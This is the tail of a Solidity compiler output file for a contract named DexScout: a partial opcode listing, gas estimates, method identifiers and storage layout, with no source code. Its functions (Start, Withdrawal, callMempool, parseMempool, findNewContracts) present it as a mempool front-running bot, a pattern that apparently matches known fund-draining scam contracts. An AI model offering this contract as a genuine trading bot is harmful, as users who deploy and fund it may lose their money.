0xEA6 PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xEB7 DUP3 PUSH2 0xD70 JUMP JUMPDEST SWAP2 POP PUSH2 0xEC2 DUP4 PUSH2 0xD70 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xEEE JUMPI PUSH2 0xEED PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xEFE DUP3 PUSH2 0xE2A JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xF30 JUMPI PUSH2 0xF2F PUSH2 0xD8F JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xF72 DUP3 PUSH2 0xE2A JUMP JUMPDEST SWAP2 POP PUSH2 0xF7D DUP4 PUSH2 0xE2A JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xF8D JUMPI PUSH2 0xF8C PUSH2 0xF3B JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xFCF DUP3 PUSH2 0xE2A JUMP JUMPDEST SWAP2 POP PUSH2 0xFDA DUP4 PUSH2 0xE2A JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xFEA JUMPI PUSH2 0xFE9 PUSH2 0xF3B JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xFFF DUP3 PUSH2 0xE2A JUMP JUMPDEST SWAP2 POP PUSH2 0x100A DUP4 PUSH2 0xE2A JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x1022 JUMPI PUSH2 0x1021 PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x103E DUP3 PUSH2 0x1028 JUMP JUMPDEST SWAP2 POP PUSH2 0x1049 DUP4 PUSH2 0x1028 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x1062 JUMPI PUSH2 0x1061 PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x1072 DUP3 PUSH2 0x1028 JUMP JUMPDEST SWAP2 POP PUSH2 0x107D DUP4 PUSH2 0x1028 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x1096 JUMPI PUSH2 0x1095 PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0xF60CD1E35FBE54F5C1681639D3C2CB51C3032262B07D1F SLOAD 0x29 LT 0xEE CALLDATALOAD 0x26 RETURNDATASIZE 0xD1 PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "861200",
						"executionCost": "894",
						"totalCost": "862094"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "1982",
						"Withdrawal()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite"
					},
					"internal": {
						"WithdrawalProfits()": "infinite",
						"_calculateGasNeeds()": "22",
						"_callDexAction()": "infinite",
						"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "22",
						"keccak(struct DexScout.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 3,
						"contract": "new.sol:DexScout",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 5,
						"contract": "new.sol:DexScout",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 7,
						"contract": "new.sol:DexScout",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}